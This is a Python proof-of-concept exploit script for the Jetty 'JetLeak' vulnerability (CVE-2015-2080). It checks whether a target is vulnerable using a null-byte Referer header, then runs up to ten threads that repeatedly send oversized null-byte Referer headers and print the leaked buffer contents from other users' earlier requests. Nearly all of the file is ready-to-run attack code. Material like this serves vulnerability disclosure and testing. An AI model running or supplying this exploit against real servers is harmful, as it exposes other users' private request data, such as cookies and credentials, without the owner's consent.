#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Provides a prove-of-concept code for arbitrary shared buffer reading on Jetty.

Enumerates arbitrary information of past requests on any endpoint on Jetty,
this vulnerability target the CVE-2015-2080 on Jetty buffered stream.
"""

from __future__ import division

import _thread
import argparse
import os
import signal
import sys
import time
from urllib.parse import urlparse

import requests
from colorama import init, Fore

__author__ = "Jonas \"NULL\" Uliana"
__copyright__ = "Copyleft"


def main():
    init()

    parser = argparse.ArgumentParser(description="Provides a prove-of-concept code for arbitrary buffer reading of "
                                                 "Jetty insecure referer validation")

    parser.add_argument("-t", "--threads", help="threads for buffered request", type=threads_definition_type, default=2)
    parser.add_argument("-d", "--delay", help="delay (in milliseconds) between requests", type=int, default=750)
    parser.add_argument("-u", "--url", help="URL with endpoint to exploit", type=url_type, required=True)
    parser.add_argument("-e", "--exploit", help="jump validation and just exploit", type=bool, default=False)
    parser.add_argument("-o", "--output", help="output directory for save valid responses", type=str,
                        default=os.path.join(os.getcwd(), 'responses'))

    args = parser.parse_args()

    if not args.exploit:
        response = requests.get(args.url, headers={"Referer": "\x00"})
        if response.status_code == 400 and ("Illegal character 0x0 in state" in response.text):
            print(Fore.CYAN + '> ' + Fore.RESET + 'confirmed, target is vulnerable to JetLeak')
        else:
            print(Fore.RED + '[!] ' + Fore.RESET + 'Target is not vulnerable to JetLeak', file=sys.stderr)
            sys.exit(-1)

    try:
        for i in range(args.threads):
            _thread.start_new_thread(shot_the_payload, (f'shooter-{i}', args.delay / 1000, args.url))
    except _thread.error:
        print(Fore.RED + '[!] ' + Fore.RESET + 'Error spawning thread', file=sys.stderr)

    dont_stop_me()


def signal_handler(sig, frame):
    print(Fore.CYAN + '> ' + Fore.RESET + 'exiting gracefully...')
    sys.exit(0)


def dont_stop_me():
    signal.signal(signal.SIGINT, signal_handler)
    print(Fore.CYAN + '> ' + Fore.RESET + 'press CTRL+C to exit...')
    while 1:
        pass


def shot_the_payload(thread_name, delay, target):
    print(Fore.CYAN + '> ' + Fore.RESET + f'thread {thread_name} spawned')
    while 1:
        response = requests.get(target, headers={"Referer": chr(0) * 44})
        print(response.text)
        time.sleep(delay)


def threads_definition_type(limit):
    limit = int(limit)
    if limit > 10 or limit < 1:
        raise argparse.ArgumentTypeError("Maximum thread counter is 10, and the minimum is 1")
    return limit


def url_type(url):
    temp_url = urlparse(url)
    if temp_url.scheme == '' and temp_url.netloc == '':
        raise argparse.ArgumentTypeError("Invalid URL")
    return url


if __name__ == "__main__":
    main()
